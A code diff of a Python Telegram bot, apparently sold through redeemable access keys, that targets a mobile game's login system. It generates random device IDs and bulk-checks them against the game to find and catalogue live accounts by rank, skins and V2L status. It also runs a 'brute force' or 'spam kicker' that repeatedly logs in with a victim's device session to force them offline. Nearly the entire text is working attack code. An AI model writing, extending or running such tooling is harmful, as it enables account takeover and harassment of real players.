-                break
-            
-            chunk = devices[i:i+chunk_size]
-            for device in chunk:
-                result = process_device_check(device)
-                processed += 1
-                if result['success']:
-                    found += 1
-                    save_check_result(result)
-                
-                if processed % 10 == 0:
-                    try:
-                        await status_msg.edit_text(
-                            f"⏳ *Processing...*\n"
-                            f"📌 Progress: {processed}/{len(devices)} devices\n"
-                            f"✅ Found: {found} accounts\n"
-                            f"🎯 Rate: {found/processed*100:.1f}%",
-                            parse_mode='Markdown'
-                        )
-                    except Exception as e:
-                        logger.error(f"Error updating status: {e}")
-        
-        context.user_data['bulk_running'] = False
-        
-        keyboard = [
-            [InlineKeyboardButton("📥 Download Results", callback_data="download_bulk")],
-            [InlineKeyboardButton("🔙 Main Menu", callback_data="menu_main")],
-        ]
-        
-        await status_msg.edit_text(
-            f"✅ *Bulk Check Complete!*\n\n"
-            f"📊 Processed: {processed:,} devices\n"
-            f"✅ Found: {found:,} valid accounts\n"
-            f"🎯 Success Rate: {found/processed*100:.1f}%\n\n"
-            f"Results saved to output folders.",
-            reply_markup=InlineKeyboardMarkup(keyboard),
-            parse_mode='Markdown'
-        )
+        return
     
-    except Exception as e:
-        logger.error(f"Error in start_bulk_check_callback: {e}")
-
-async def download_bulk_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle bulk results download"""
-    try:
-        query = update.callback_query
-        await query.answer()
-        
-        import zipfile
-        from io import BytesIO
-        
-        zip_buffer = BytesIO()
-        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
-            detail_file = os.path.join(OUTPUT_DIR, FOLDERS["detail"], "all_hits_detail.txt")
-            if os.path.exists(detail_file):
-                zip_file.write(detail_file, "all_hits_detail.txt")
-            
-            raw_file = os.path.join(OUTPUT_DIR, FOLDERS["detail"], "raw_devices_detail.txt")
-            if os.path.exists(raw_file):
-                zip_file.write(raw_file, "raw_devices_detail.txt")
-            
-            for rank in ['warrior', 'elite', 'master', 'gm', 'epic', 'legend', 'mythic']:
-                rank_file = os.path.join(OUTPUT_DIR, FOLDERS[f"rank_{rank}"], f"{rank}_hits.txt")
-                if os.path.exists(rank_file):
-                    zip_file.write(rank_file, f"rank_{rank}.txt")
-        
-        zip_buffer.seek(0)
-        await query.message.reply_document(
-            document=InputFile(zip_buffer, filename="bulk_results.zip"),
-            caption="📊 Bulk Check Results"
-        )
-    
-    except Exception as e:
-        logger.error(f"Error in download_bulk_callback: {e}")
-
-# ─── Device Generation ─────────────────────────────────────────
-
-def generate_devices(count: int, output_file: str):
-    """Generate device IDs"""
-    REAL_OEM_HASHES = [
-        "cd9e459ea708a948d5c2f5a6ca8838cf", 
-        "b7f9a1c2d3e4f5061728394a5b6c7d8e",
-        "a1c8f304e792b516d8e0349acb1527fe", 
-    ]
-    
-    def random_hex(n: int) -> str:
-        return ''.join(random.choices(HEX_CHARS, k=n))
-    
-    generators = [
-        lambda: f"and_{random_hex(32)}{random_hex(16)}{uuid.uuid4()}\n",
-        lambda: f"and_{random.choice(REAL_OEM_HASHES)}{random_hex(16)}{uuid.uuid4()}\n",
-        lambda: f"and_{random.choice(REAL_OEM_HASHES)}-{uuid.uuid4()}\n",
-        lambda: f"and_{random_hex(32)}-{uuid.uuid4()}\n",
-        lambda: f"ios_{str(uuid.uuid4()).upper()}\n",
-    ]
-    
-    with open(output_file, 'w', encoding='utf-8') as f:
-        for i in range(count):
-            f.write(random.choice(generators)())
-            if i % 1000 == 0:
-                f.flush()
-
-# ─── Save Results ──────────────────────────────────────────────
-
-def save_check_result(result: Dict):
-    """Save check result to output files"""
-    try:
-        device = result['device_id']
-        acc = result['account_id']
-        zone = result['zone_id']
-        
-        rank_text = result['rank'] or 'Unranked'
-        rank_category = "other"
-        if rank_text:
-            rt = rank_text.lower()
-            if "mythic" in rt or "immortal" in rt or "glory" in rt:
-                rank_category = "mythic"
-            elif "legend" in rt:
-                rank_category = "legend"
-            elif "epic" in rt:
-                rank_category = "epic"
-            elif "grandmaster" in rt:
-                rank_category = "gm"
-            elif "master" in rt:
-                rank_category = "master"
-            elif "elite" in rt:
-                rank_category = "elite"
-            elif "warrior" in rt:
-                rank_category = "warrior"
-        
-        card = (
-            f"Device ID    : {device}\n"
-            f"Account      : {acc} ({zone})\n"
-            f"Nickname     : {result['nickname']} (Lv.{result['level']})\n"
-            f"Status       : NORMAL\n"
-            f"Rank         : {result['rank']}\n"
-            f"Max Rank     : {result['highest_rank']}\n"
-            f"Heroes       : {result['hero_count']}\n"
-            f"Skins        : {result['skin_count']}\n"
-            f"V2L Status   : {result['v2l_status']}\n"
-            f"Created      : {result['created_at'] or 'N/A'}\n"
-            f"{'='*60}\n"
-        )
-        
-        detail_file = os.path.join(OUTPUT_DIR, FOLDERS["detail"], "all_hits_detail.txt")
-        with open(detail_file, 'a', encoding='utf-8') as f:
-            f.write(card)
-        
-        raw_file = os.path.join(OUTPUT_DIR, FOLDERS["detail"], "raw_devices_detail.txt")
-        with open(raw_file, 'a', encoding='utf-8') as f:
-            f.write(f"{device}\n")
-        
-        if rank_category != "other":
-            rank_folder = os.path.join(OUTPUT_DIR, FOLDERS[f"rank_{rank_category}"])
-            os.makedirs(rank_folder, exist_ok=True)
-            rank_file = os.path.join(rank_folder, f"{rank_category}_hits.txt")
-            with open(rank_file, 'a', encoding='utf-8') as f:
-                f.write(card)
-        
-        v2l_status = str(result['v2l_status']).lower()
-        if v2l_status in ['enabled', 'yes', '1', 'true']:
-            v2l_file = os.path.join(OUTPUT_DIR, FOLDERS["v2l_active"], "v2l_active.txt")
-            with open(v2l_file, 'a', encoding='utf-8') as f:
-                f.write(card)
-    
-    except Exception as e:
-        logger.error(f"Error saving result: {e}")
-
-# ─── Message Handler ───────────────────────────────────────────
-
-async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle incoming messages"""
-    try:
-        user_id = update.effective_user.id
-        state = context.user_data.get('state')
-        
-        if not is_authorized(user_id):
-            await safe_reply(
-                update,
-                "🔒 *Access Denied*\n\nPlease use /redeem <KEY> to activate your access.",
-                parse_mode='Markdown'
-            )
-            return
-        
-        if state == AWAITING_DEVICE:
-            await handle_device_input(update, context)
-        
-        elif state == AWAITING_FILE:
-            await handle_file_upload(update, context)
-        
-        elif state == GENERATOR_MENU:
-            try:
-                size = float(update.message.text.strip())
-                if size <= 0:
-                    raise ValueError
-                context.user_data['state'] = None
-                await safe_reply(
-                    update,
-                    f"⏳ *Generating {size}MB of Device IDs...*",
-                    parse_mode='Markdown'
-                )
-                output_file = os.path.join(OUTPUT_DIR, FOLDERS["generated"], "generated_devices.txt")
-                if os.path.exists(output_file):
-                    os.remove(output_file)
-                count = int((size * 1024 * 1024) / 80 * 1.02)
-                generate_devices(count, output_file)
-                
-                if os.path.exists(output_file):
-                    with open(output_file, 'r') as f:
-                        line_count = sum(1 for _ in f)
-                    await safe_reply(
-                        update,
-                        f"✅ *Generation Complete!*\n\n📊 Generated: {line_count:,} devices\n"
-                        f"📦 File size: ~{size}MB\n\nUse /start to continue.",
-                        parse_mode='Markdown'
-                    )
-                else:
-                    await safe_reply(update, "❌ *Generation Failed*", parse_mode='Markdown')
-            except:
-                await safe_reply(
-                    update,
-                    "❌ *Invalid size*\n\nPlease enter a valid number (e.g., 100)",
-                    parse_mode='Markdown'
-                )
-        
-        elif state == AWAITING_KEY:
-            key_str = update.message.text.strip().upper()
-            if key_manager.revoke_key(key_str, user_id):
-                await safe_reply(
-                    update,
-                    f"✅ *Key Revoked*\n\nKey: `{key_str}`\nSuccessfully revoked.",
-                    parse_mode='Markdown'
-                )
-            else:
-                await safe_reply(
-                    update,
-                    f"❌ *Key not found*\n\nKey: `{key_str}`\nPlease check the key and try again.",
-                    parse_mode='Markdown'
-                )
-            context.user_data['state'] = None
-            await show_key_management(update, context)
-        
-        elif state == AWAITING_BRUTE_CONFIG:
-            await handle_brute_config(update, context)
-        
-        else:
-            await safe_reply(
-                update,
-                "❓ *Unknown command*\n\nUse /start to see the main menu.",
-                parse_mode='Markdown'
-            )
-    
-    except Exception as e:
-        logger.error(f"Error in handle_message: {e}")
-
-# ─── Device Input Handler ──────────────────────────────────────
-
-async def handle_device_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle device ID input for single check"""
-    try:
-        device_id = update.message.text.strip()
-        
-        if device_id.lower() in ['/cancel', 'cancel']:
-            context.user_data['state'] = None
-            await show_main_menu(update, context)
-            return
-        
-        if not device_id.startswith(('and_', 'ios_')):
-            await safe_reply(
-                update,
-                "❌ *Invalid Device ID*\n\nDevice ID must start with 'and_' or 'ios_'.\n"
-                "Please try again or type /cancel.",
-                parse_mode='Markdown'
-            )
-            return
-        
-        msg = await update.message.reply_text(
-            "⏳ *Checking device...*\nThis may take 10-20 seconds.",
-            parse_mode='Markdown'
-        )
-        
-        result = process_device_check(device_id)
-        
-        if result['success']:
-            rank_emoji = "🏆"
-            if "Mythic" in str(result['rank']):
-                rank_emoji = "👑"
-            elif "Legend" in str(result['rank']):
-                rank_emoji = "⭐"
-            
-            v2l_emoji = "🟢" if str(result['v2l_status']).lower() in ['enabled', 'yes', '1', 'true'] else "🔴"
-            
-            text = (
-                f"✅ *Account Found!*\n\n"
-                f"📱 Device: `{device_id[:30]}...`\n"
-                f"🆔 Account: `{result['account_id']}` ({result['zone_id']})\n"
-                f"👤 Nickname: *{result['nickname']}* (Lv.{result['level']})\n"
-                f"{rank_emoji} Rank: *{result['rank']}*\n"
-                f"🌟 Highest: {result['highest_rank']}\n"
-                f"🎨 Skins: {result['skin_count']}  |  🦸 Heroes: {result['hero_count']}\n"
-                f"🔐 V2L: {v2l_emoji} {result['v2l_status']}\n"
-                f"📅 Created: {result['created_at'] or 'N/A'}\n"
-                f"⚡ Status: *{'✅ NORMAL' if 'ban' not in str(result['ban_status']).lower() else '⚠️ BANNED'}*\n\n"
-                f"👑 *Premium Devid Seker*\nCreated by: @ZyronDevv"
-            )
-            
-            await msg.edit_text(text, parse_mode='Markdown')
-            save_check_result(result)
-            await show_main_menu(update, context)
-            
-        else:
-            error_msg = result.get('error', 'Unknown error')
-            await msg.edit_text(
-                f"❌ *Check Failed*\n\nDevice: `{device_id}`\nError: {error_msg}\n\n"
-                f"Please try again with a different device.",
-                parse_mode='Markdown'
-            )
-    
-    except Exception as e:
-        logger.error(f"Error in handle_device_input: {e}")
-
-# ─── File Upload Handler ──────────────────────────────────────
-
-async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle uploaded file for bulk check"""
-    try:
-        document = update.message.document
-        
-        if not document:
-            await safe_reply(update, "❌ *No file found*\n\nPlease upload a `.txt` file.", parse_mode='Markdown')
-            return
-        
-        if document.file_size > 10 * 1024 * 1024:
-            await safe_reply(update, "❌ *File too large*\n\nFile must be less than 10MB.", parse_mode='Markdown')
-            return
-        
-        msg = await update.message.reply_text("⏳ *Downloading file...*", parse_mode='Markdown')
-        
-        file = await document.get_file()
-        file_path = os.path.join(OUTPUT_DIR, "uploaded_devices.txt")
-        await file.download_to_drive(file_path)
-        
-        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-            devices = [line.strip() for line in f if line.strip()]
-        
-        if not devices:
-            await msg.edit_text("❌ *Empty file*\n\nNo device IDs found in the file.", parse_mode='Markdown')
-            return
-        
-        context.user_data['bulk_devices'] = devices
-        await start_bulk_check(update, context, msg)
-        
-    except Exception as e:
-        logger.error(f"Error in handle_file_upload: {e}")
-        await safe_reply(update, f"❌ *Error:* {str(e)}", parse_mode='Markdown')
-
-# ─── Brute Force Handler ──────────────────────────────────────
-
-async def handle_brute_config(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle brute force device input"""
-    try:
-        device_id = update.message.text.strip()
-        
-        if device_id.lower() in ['/cancel', 'cancel']:
-            context.user_data['state'] = None
-            await show_main_menu(update, context)
-            return
-        
-        if not device_id.startswith(('and_', 'ios_')):
-            await safe_reply(
-                update,
-                "❌ *Invalid Device ID*\n\nDevice ID must start with 'and_' or 'ios_'.\n"
-                "Please try again or type /cancel.",
-                parse_mode='Markdown'
-            )
-            return
-        
-        msg = await update.message.reply_text("⏳ *Verifying device...*", parse_mode='Markdown')
-        
-        result = process_device_check(device_id)
-        if not result['success']:
-            await msg.edit_text(
-                f"❌ *Invalid device or login failed*\n\nError: {result.get('error', 'Unknown')}",
-                parse_mode='Markdown'
-            )
-            return
-        
-        context.user_data['brute_device'] = device_id
-        context.user_data['brute_account'] = result
-        context.user_data['brute_running'] = False  # Reset stop flag
-        
-        keyboard = [
-            [InlineKeyboardButton("🧪 Single Test", callback_data="brute_1")],
-            [InlineKeyboardButton("⚡ 10x Kicks", callback_data="brute_10")],
-            [InlineKeyboardButton("🚀 50x Kicks", callback_data="brute_50")],
-            [InlineKeyboardButton("💥 100x Kicks", callback_data="brute_100")],
-            [InlineKeyboardButton("♾️ Unlimited", callback_data="brute_unlimited")],
-            [InlineKeyboardButton("🔙 Back", callback_data="menu_main")],
-        ]
-        
-        await msg.edit_text(
-            f"⚡ *Brute Force Setup*\n\nTarget: *{result['nickname']}*\n"
-            f"Account: `{result['account_id']}` ({result['zone_id']})\n"
-            f"Rank: {result['rank']}\n\nSelect attack intensity:",
-            reply_markup=InlineKeyboardMarkup(keyboard),
-            parse_mode='Markdown'
-        )
-    
-    except Exception as e:
-        logger.error(f"Error in handle_brute_config: {e}")
-
-async def brute_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle brute force callbacks"""
-    try:
-        query = update.callback_query
-        await query.answer()
-        
-        data = query.data
-        account = context.user_data.get('brute_account')
-        
-        if not account:
-            await query.edit_message_text(
-                "❌ *No target set*\n\nPlease set a target first.",
-                parse_mode='Markdown'
-            )
-            return
-        
-        brute_configs = {
-            "brute_1": (1, 0),
-            "brute_10": (10, 2),
-            "brute_50": (50, 1),
-            "brute_100": (100, 0.5),
-            "brute_unlimited": (0, 0.5),
-        }
-        
-        config = brute_configs.get(data)
-        if not config:
-            return
-        
-        loops, delay = config
-        
-        # Set running flag
-        context.user_data['brute_running'] = True
-        
-        await query.edit_message_text(
-            f"⚡ *Starting Brute Force*\n\nTarget: *{account['nickname']}*\n"
-            f"Loops: {'∞' if loops == 0 else loops}\nDelay: {delay}s\n\n"
-            f"⏳ Starting...\n\n"
-            f"Press the STOP button below to cancel anytime.",
-            parse_mode='Markdown'
-        )
-        
-        await run_brute_force(update, context, query, account, loops, delay)
-    
-    except Exception as e:
-        logger.error(f"Error in brute_callback: {e}")
-
-async def run_brute_force(update, context, query, account, loops, delay):
-    """Execute brute force attack with stop button"""
-    try:
-        device_id = context.user_data.get('brute_device')
+    if data.startswith("bf_kick_"):
+        device_id = context.user_data.get("bf_device")
         if not device_id:
+            await query.edit_message_text("❌ Session expired. Please restart.")
             return
         
+        user_devices = get_user_bf_devices(user_id)
+        limit = get_bf_limit(user_id)
+        
+        if not is_admin(user_id):
+            if limit > 0 and len(user_devices) >= limit and device_id not in user_devices:
+                await query.edit_message_text(
+                    f"❌ <b>Device Limit Reached!</b>\n\n"
+                    f"You have reached the limit of <b>{limit}</b> device(s).\n"
+                    f"📊 Used: {len(user_devices)}/{limit}\n"
+                    f"💡 Contact admin to increase your limit.",
+                    parse_mode=ParseMode.HTML,
+                    reply_markup=back_keyboard()
+                )
+                return
+            
+            if device_id in user_devices:
+                await query.edit_message_text(
+                    f"❌ <b>Device Already Used!</b>\n\n"
+                    f"Each device can only be used once.\n"
+                    f"📊 Used: {len(user_devices)}/{limit}",
+                    parse_mode=ParseMode.HTML,
+                    reply_markup=back_keyboard()
+                )
+                return
+        
+        if "custom" in data:
+            context.user_data["bf_custom_stage"] = "loops"
+            context.user_data["waiting_for_bruteforce"] = False
+            await query.edit_message_text(
+                "🛠️ <b>Custom Kick Settings</b>\n\n"
+                "Send number of loops (0 = unlimited):\n\n"
+                "Type /cancel to abort.",
+                parse_mode=ParseMode.HTML
+            )
+            return
+        
+        parts = data.split("_")
+        loops = int(parts[2])
+        delay = float(parts[3]) if len(parts) > 3 else 0.0
+        
+        context.user_data["bf_stop_flag"] = False
+        context.user_data["bf_refunded"] = False
+        asyncio.create_task(run_spam_kick(query, context, device_id, loops, delay, user_id))
+
+# ────────────────────────────────────────────────────────────────
+# 18. SPAM KICK RUNNER
+# ────────────────────────────────────────────────────────────────
+
+async def run_spam_kick(query, context, device_id, total_loops, delay_sec, user_id):
+    session_key = f"{user_id}_{device_id}"
+    
+    with bf_sessions_lock:
+        active_bf_sessions[session_key] = {"stop": False, "running": True, "refunded": False}
+    
+    profile = fetch_session_profile(device_id)
+    
+    if not profile:
+        with bf_sessions_lock:
+            if session_key in active_bf_sessions:
+                del active_bf_sessions[session_key]
+        await query.edit_message_text(
+            "❌ <b>Invalid Device ID!</b>\n"
+            "Device may be dead or login failed.",
+            parse_mode=ParseMode.HTML,
+            reply_markup=back_keyboard()
+        )
+        return
+    
+    # Provisionally commit usage so concurrent kicks are blocked.
+    # This will be REFUNDED at the end if the kick is stopped/cancelled.
+    if not is_admin(user_id):
+        add_user_bf_device(user_id, device_id)
+    
+    context.user_data["bf_refunded"] = False
+    
+    loop_label = f"{total_loops:,} Loops" if total_loops > 0 else "♾️ Unlimited"
+    
+    status_msg = await query.edit_message_text(
+        f"⚡ <b>SPAM KICKER ACTIVE</b>\n"
+        f"═══════════════════════════\n"
+        f"👤 Target: <b>{escape_html(profile['nickname'])}</b>\n"
+        f"🆔 ID: <code>{profile['account_id']}</code>\n"
+        f"🏆 Rank: {profile['rank']}\n"
+        f"🔄 Mode: {loop_label}\n"
+        f"⏱️ Delay: {delay_sec}s\n"
+        f"═══════════════════════════\n"
+        f"⏳ Running... Press 'Stop Current Kick' to stop.",
+        parse_mode=ParseMode.HTML
+    )
+    
+    results = {"count": 0, "success": 0, "fail": 0, "latencies": [], "running": True, "duration": 0}
+    
+    def do_kicks():
+        count = 0
         success_count = 0
         fail_count = 0
-        count = 0
+        latencies = []
         start_time = time.time()
         
-        # Create keyboard with STOP button
-        keyboard = [[InlineKeyboardButton("🛑 STOP BRUTE FORCE", callback_data="brute_stop")]]
-        
-        status_msg = await query.message.edit_text(
-            f"⚡ *Brute Force Running*\n\nTarget: *{account['nickname']}*\n"
-            f"Progress: 0/{'∞' if loops == 0 else loops}\n"
-            f"✅ Success: 0\n❌ Failed: 0\n⏱️ Elapsed: 0s\n\n"
-            f"🛑 Press STOP to cancel",
-            reply_markup=InlineKeyboardMarkup(keyboard),
-            parse_mode='Markdown'
-        )
-        
-        def send_kick(device, acc_info):
-            try:
-                with GameConnection(device_id=device) as conn:
-                    if conn.login_to_login_server():
-                        if conn.get_game_server():
-                            if conn.connect_to_game_server():
-                                return True
-                return False
-            except:
-                return False
-        
         try:
-            while True:
-                # Check if user requested stop
-                if not context.user_data.get('brute_running', True):
-                    await status_msg.edit_text(
-                        f"🛑 *Brute Force Stopped by User*\n\n"
-                        f"Target: *{account['nickname']}*\n"
-                        f"📊 Total Attempts: {count}\n"
-                        f"✅ Success: {success_count}\n"
-                        f"❌ Failed: {fail_count}\n"
-                        f"🎯 Success Rate: {success_count/count*100:.1f}%\n"
-                        f"⏱️ Duration: {time.time() - start_time:.1f}s\n\n"
-                        f"Use /start to continue.",
-                        parse_mode='Markdown'
-                    )
-                    return
+            while results["running"]:
+                with bf_sessions_lock:
+                    if session_key in active_bf_sessions and active_bf_sessions[session_key].get("stop", False):
+                        results["running"] = False
+                        break
                 
+                if context and context.user_data.get("bf_stop_flag", False):
+                    results["running"] = False
+                    break
+                    
                 count += 1
-                success = send_kick(device_id, account)
-                
-                if success:
+                ok, lat, desc = send_session_kick(profile)
+                latencies.append(lat)
+                if ok:
                     success_count += 1
                 else:
                     fail_count += 1
-                
-                # Update status every 5 kicks
-                if count % 5 == 0:
-                    elapsed = time.time() - start_time
-                    try:
-                        await status_msg.edit_text(
-                            f"⚡ *Brute Force Running*\n\nTarget: *{account['nickname']}*\n"
-                            f"Progress: {count}/{'∞' if loops == 0 else loops}\n"
-                            f"✅ Success: {success_count}\n❌ Failed: {fail_count}\n"
-                            f"🎯 Rate: {success_count/count*100:.1f}%\n"
-                            f"⏱️ Elapsed: {elapsed:.0f}s\n\n"
-                            f"🛑 Press STOP to cancel",
-                            reply_markup=InlineKeyboardMarkup(keyboard),
-                            parse_mode='Markdown'
-                        )
-                    except Exception as e:
-                        logger.error(f"Error updating status: {e}")
-                
-                if loops > 0 and count >= loops:
+                if total_loops > 0 and count >= total_loops:
                     break
-                
-                if delay > 0:
-                    time.sleep(delay)
-                    
-        except Exception as e:
-            logger.error(f"Brute force loop error: {e}")
-        
-        # Show completion summary
-        elapsed = time.time() - start_time
-        final_keyboard = [[InlineKeyboardButton("🔙 Main Menu", callback_data="menu_main")]]
-        
-        await status_msg.edit_text(
-            f"✅ *Brute Force Complete!*\n\nTarget: *{account['nickname']}*\n"
-            f"📊 Total Attempts: {count}\n✅ Success: {success_count}\n"
-            f"❌ Failed: {fail_count}\n🎯 Success Rate: {success_count/count*100:.1f}%\n"
-            f"⏱️ Duration: {elapsed:.1f}s\n⚡ Speed: {count/elapsed:.1f} kicks/s",
-            reply_markup=InlineKeyboardMarkup(final_keyboard),
-            parse_mode='Markdown'
-        )
-        
-        # Reset running flag
-        context.user_data['brute_running'] = False
-    
-    except Exception as e:
-        logger.error(f"Error in run_brute_force: {e}")
-
-# ─── Cancel Command ────────────────────────────────────────────
-
-async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /cancel command"""
-    try:
-        context.user_data['state'] = None
-        context.user_data['bulk_running'] = False
-        context.user_data['brute_running'] = False
-        await safe_reply(
-            update,
-            "✅ *Cancelled*\n\nOperation cancelled. Use /start to return to main menu.",
-            parse_mode='Markdown'
-        )
-    except Exception as e:
-        logger.error(f"Error in cancel_command: {e}")
-
-# ─── Error Handler ─────────────────────────────────────────────
-
-async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle errors gracefully"""
-    try:
-        logger.error(f"Update {update} caused error {context.error}")
-        
-        error_message = "❌ *An error occurred*\n\nPlease try again later."
-        
-        if isinstance(context.error, TimedOut):
-            error_message = "⏰ *Request timed out*\n\nPlease try again."
-        elif isinstance(context.error, NetworkError):
-            error_message = "🌐 *Network error*\n\nPlease check your internet connection."
-        elif isinstance(context.error, RetryAfter):
-            error_message = f"⏳ *Rate limited*\n\nPlease wait {context.error.retry_after} seconds."
-        
-        try:
-            if update and update.effective_message:
-                await update.effective_message.reply_text(error_message, parse_mode='Markdown')
-            elif update and update.callback_query:
-                await update.callback_query.message.reply_text(error_message, parse_mode='Markdown')
-        except:
+                if delay_sec > 0:
+                    time.sleep(delay_sec)
+        except Exception:
             pass
+        
+        duration = time.time() - start_time
+        results["count"] = count
+        results["success"] = success_count
+        results["fail"] = fail_count
+        results["latencies"] = latencies
+        results["duration"] = duration
+        results["running"] = False
+        
+        with bf_sessions_lock:
+            if session_key in active_bf_sessions:
+                del active_bf_sessions[session_key]
     
-    except Exception as e:
-        logger.error(f"Error in error_handler: {e}")
+    kick_thread = threading.Thread(target=do_kicks, daemon=True)
+    kick_thread.start()
+    
+    last_update = time.time()
+    while results["running"] or kick_thread.is_alive():
+        await asyncio.sleep(1)
+        if time.time() - last_update > 5:
+            count = results.get("count", 0)
+            success = results.get("success", 0)
+            if count > 0:
+                try:
+                    await status_msg.edit_text(
+                        f"⚡ <b>SPAM KICKER ACTIVE</b>\n"
+                        f"═══════════════════════════\n"
+                        f"👤 Target: <b>{escape_html(profile['nickname'])}</b>\n"
+                        f"🔄 Attempts: {count:,}\n"
+                        f"✅ Success: {success:,}\n"
+                        f"❌ Failed: {results.get('fail', 0):,}\n"
+                        f"⏱️ Delay: {delay_sec}s\n"
+                        f"═══════════════════════════\n"
+                        f"⏳ Still running...",
+                        parse_mode=ParseMode.HTML
+                    )
+                except Exception:
+                    pass
+            last_update = time.time()
+    
+    kick_thread.join(timeout=2)
+    
+    count = results["count"]
+    success_count = results["success"]
+    fail_count = results["fail"]
+    latencies = results["latencies"]
+    duration = results.get("duration", 0)
+    
+    avg_lat = (sum(latencies) / len(latencies)) if latencies else 0.0
+    succ_pct = (success_count / count * 100) if count > 0 else 0.0
+    speed = (count / duration) if duration > 0 else 0.0
+    
+    was_stopped = context.user_data.get("bf_stop_flag", False) or context.user_data.get("bf_refunded", False)
+    context.user_data["bf_stop_flag"] = False
+    
+    # ─── REFUND BF USAGE IF CANCELLED/STOPPED ───
+    refund_note = ""
+    if not is_admin(user_id):
+        if was_stopped or context.user_data.get("bf_refunded", False):
+            if refund_user_bf_device(user_id, device_id):
+                refund_note = "\n♻️ <b>Usage refunded (+1 remaining)</b>"
+        # If completed normally, usage stays committed (already added at start)
+    
+    context.user_data["bf_refunded"] = False
+    
+    kb = InlineKeyboardMarkup([
+        [InlineKeyboardButton("🔁 Kick Again", callback_data="bf_menu")],
+        [InlineKeyboardButton("🔙 Main Menu", callback_data="main_menu")]
+    ])
+    
+    status_text = "🛑 <b>STOPPED BY USER</b>\n" if was_stopped else "📊 <b>SPAM KICK SUMMARY</b>\n"
+    
+    try:
+        await status_msg.edit_text(
+            f"{status_text}"
+            f"═══════════════════════════\n"
+            f"👤 Target: <b>{escape_html(profile['nickname'])}</b>\n"
+            f"⏱️ Duration: {duration/60:.1f} min ({duration:.1f}s)\n"
+            f"🔄 Total Attempts: {count:,}\n"
+            f"✅ Success Kicks: {success_count:,} ({succ_pct:.1f}%)\n"
+            f"❌ Failed Kicks: {fail_count:,}\n"
+            f"⚡ Avg Latency: {avg_lat:.1f} ms\n"
+            f"🚀 Speed: {speed:.2f} kick/s\n"
+            f"═══════════════════════════"
+            f"{refund_note}\n"
+            f"✨ Created by: @ZyronDevv",
+            parse_mode=ParseMode.HTML, reply_markup=kb
+        )
+    except Exception:
+        pass
 
 # ────────────────────────────────────────────────────────────────
-# MAIN APPLICATION
+# 19. ADMIN PANEL
+# ────────────────────────────────────────────────────────────────
+
+async def show_admin_panel(query, context):
+    keys = list_all_keys()
+    users = list_all_users()
+    active_keys = sum(1 for k in keys if k["status"] == "active")
+    active_users = sum(1 for u in users if u.get("status") == "active")
+    bf_limit = get_bf_limit()
+    
+    text = (
+        f"🛠️ <b>ADMIN PANEL</b>\n"
+        f"═══════════════════════════\n"
+        f"🔑 Total Keys: {len(keys)}\n"
+        f"✅ Active Keys: {active_keys}\n"
+        f"👥 Total Users: {len(users)}\n"
+        f"🟢 Active Users: {active_users}\n"
+        f"⚡ BF Global Limit: {bf_limit}\n"
+        f"═══════════════════════════\n"
+        f"Choose an option below 👇"
+    )
+    await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=admin_panel_keyboard())
+
+async def handle_admin_callback(query, data, context):
+    user_id = query.from_user.id
+    
+    if data == "admin_genkey":
+        kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton("📅 1 Day", callback_data="admin_mk_1_1"),
+             InlineKeyboardButton("📅 7 Days", callback_data="admin_mk_7_1"),
+             InlineKeyboardButton("📅 30 Days", callback_data="admin_mk_30_1")],
+            [InlineKeyboardButton("♾️ Lifetime", callback_data="admin_mk_0_1"),
+             InlineKeyboardButton("📅 7d (5 uses)", callback_data="admin_mk_7_5"),
+             InlineKeyboardButton("📅 30d (10 uses)", callback_data="admin_mk_30_10")],
+            [InlineKeyboardButton("🔙 Back", callback_data="admin")]
+        ])
+        await query.edit_message_text(
+            "🔑 <b>GENERATE KEY</b>\n"
+            "═══════════════════════════\n"
+            "Select key duration & uses:",
+            parse_mode=ParseMode.HTML, reply_markup=kb
+        )
+    
+    elif data.startswith("admin_mk_"):
+        parts = data.split("_")
+        days = int(parts[2])
+        uses = int(parts[3])
+        admin_name = query.from_user.username or str(user_id)
+        key_data = create_key(days, uses, admin_name)
+        
+        dur_text = "Lifetime" if days == 0 else f"{days} days"
+        await query.edit_message_text(
+            f"✅ <b>KEY CREATED!</b>\n"
+            f"═══════════════════════════\n"
+            f"🔑 Key: <code>{key_data['key']}</code>\n"
+            f"📅 Duration: {dur_text}\n"
+            f"🔄 Max Uses: {uses}\n"
+            f"═══════════════════════════\n"
+            f"They can use: /redeem {key_data['key']}",
+            parse_mode=ParseMode.HTML, reply_markup=admin_panel_keyboard()
+        )
+    
+    elif data == "admin_listkeys":
+        keys = list_all_keys()
+        if not keys:
+            await query.edit_message_text("📋 No keys found.", parse_mode=ParseMode.HTML, reply_markup=admin_panel_keyboard())
+            return
+        
+        lines = ["📋 <b>ALL KEYS</b>", "═══════════════════════════"]
+        for k in keys[-20:]:
+            dur = "Lifetime" if k["duration_days"] == 0 else f"{k['duration_days']}d"
+            status_emoji = "✅" if k["status"] == "active" else "❌" if k["status"] in ("used", "expired") else "🚫"
+            lines.append(f"{status_emoji} <code>{k['key']}</code>")
+            lines.append(f"   Dur: {dur} | Uses: {k['uses']}/{k['max_uses']} | Status: {k['status']}")
+            if k.get("activated_by"):
+                for u in k["activated_by"]:
+                    lines.append(f"   └ {u['username']} ({u['user_id']})")
+            lines.append("")
+        
+        if len(keys) > 20:
+            lines.append(f"... and {len(keys)-20} more keys")
+        lines.append("═══════════════════════════")
+        
+        await query.edit_message_text("\n".join(lines), parse_mode=ParseMode.HTML, reply_markup=admin_panel_keyboard())
+    
+    elif data == "admin_listusers":
+        users = list_all_users()
+        if not users:
+            await query.edit_message_text("👥 No users found.", parse_mode=ParseMode.HTML, reply_markup=admin_panel_keyboard())
+            return
+        
+        lines = ["👥 <b>ALL USERS</b>", "═══════════════════════════"]
+        for u in users[-30:]:
+            status_emoji = "🟢" if u.get("status") == "active" else "🔴"
+            lines.append(f"{status_emoji} <b>{escape_html(u.get('username', 'N/A'))}</b>")
